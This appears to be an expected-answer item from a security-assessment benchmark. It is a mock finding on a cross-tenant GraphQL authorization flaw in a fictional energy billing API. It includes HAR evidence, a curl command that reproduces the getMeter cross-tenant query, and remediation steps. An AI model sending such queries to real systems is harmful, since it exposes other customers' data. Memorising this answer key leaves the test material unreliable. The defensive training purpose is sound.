# Expected Response

## System
- **Domain:** Energy / Smart Grid Billing
- **System:** PowerGrid Customer Billing API
- **Example ID:** GQL-0214

## Priority Findings

### Finding 1: Energy Grid — Resolver/Graph Traversal Injection via getMeter Exposes Cross-Tenant Meter Billing Data (Pattern 5.2)
**Severity:** High
**Category:** Injection / Resolver/Graph Traversal Injection

**Summary:**
Per §4.0 (RISK-GQL-214): The `getMeter` resolver fetches by `meterId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 5.2 — resolver/graph traversal injection): the `getMeter` resolver allows graph traversal injection — by supplying a cross-tenant `meterId`, the attacker triggers traversal into billing data belonging to another tenant. An attacker from `tenant-c4c8` queried `getMeter(id: "M-2214")` and received meter billing data belonging to `tenant-df9a`, including `CONFIDENTIAL-c4c8df9a`. In Energy / Smart Grid Billing, unauthorized access to meter readings, tariff data, and consumption patterns enables billing fraud and infrastructure mapping.

**Evidence from HAR:**
- Request: `POST https://api.powergrid-customer-b.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-c4c8`
- Query: `getMeter(id: "M-2214") { meterId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-df9a"`, `ownerId: "other-user-c4c8df9a"`, `sensitiveField: "CONFIDENTIAL-c4c8df9a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-c4c8df9a`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-214 | getMeter resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 5.2 | Resolver/graph traversal injection via meterId |
| HAR query | id: "M-2214" | Cross-tenant meter ID traversal injection |
| HAR response | tenantId | tenant-df9a returned to tenant-c4c8 |
| HAR response | sensitiveField | CONFIDENTIAL-c4c8df9a |
| HAR header | x-request-id | req-c4c8df9a |

## Steps to Reproduce

### Step 1 — getMeter graph traversal injection cross-tenant (HAR)
```bash
curl -s -X POST https://api.powergrid-customer-b.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c4c8" \
  -d '{"query": "query { getMeter(id: \"M-2214\") { meterId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenant-df9a` meter billing data including `CONFIDENTIAL-c4c8df9a`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE meter_id = $id AND tenant_id = $jwt.tenantId`.
2. Validate all graph traversal paths enforce tenant isolation at each resolver node.
3. Redis cache key: `meter:{tenantId}:{meterId}`.
